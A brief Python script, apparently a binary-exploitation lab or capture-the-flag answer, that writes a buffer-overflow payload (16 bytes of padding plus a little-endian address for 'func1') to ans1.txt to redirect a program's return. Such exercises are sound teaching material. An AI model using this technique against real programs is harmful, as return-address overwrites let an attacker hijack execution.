padding = b"A" * 16
func1_address = b'\x16\x12\x40\x00\x00\x00\x00\x00' # 小端地址
payload = padding+ func1_address
# Write the payload to a file
with open("ans1.txt", "wb") as f:
 f.write(payload)
print("Payload written to ans1.txt")